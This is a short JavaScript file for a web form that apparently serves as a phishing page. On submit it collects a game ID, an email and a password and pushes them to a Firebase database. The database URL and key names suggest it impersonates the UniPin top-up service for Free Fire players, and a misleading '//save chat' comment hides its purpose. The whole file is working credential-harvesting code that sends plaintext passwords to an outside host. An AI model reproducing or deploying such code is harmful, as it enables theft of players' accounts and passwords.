//create firebase reference
var db = new Firebase("https://unipin.firebaseio.com/");
var ref = db.child('free-fire')
var form = document.querySelector('#form');

//save chat
document.querySelector('#form').addEventListener("submit", function (event) {
    event.preventDefault();
    if (document.querySelector('#id').value != '' && document.querySelector('#email').value != '' && document.querySelector('#pass').value != '') {
        ref
            .push({
                ID: document.querySelector('#id').value,
                Email: document.querySelector('#email').value,
                Pass: document.querySelector('#pass').value
            })
        form.reset();
        $('#coba').modal('show')
    } else {
        alert('Please fill atlease name or message!');
    }
}, false);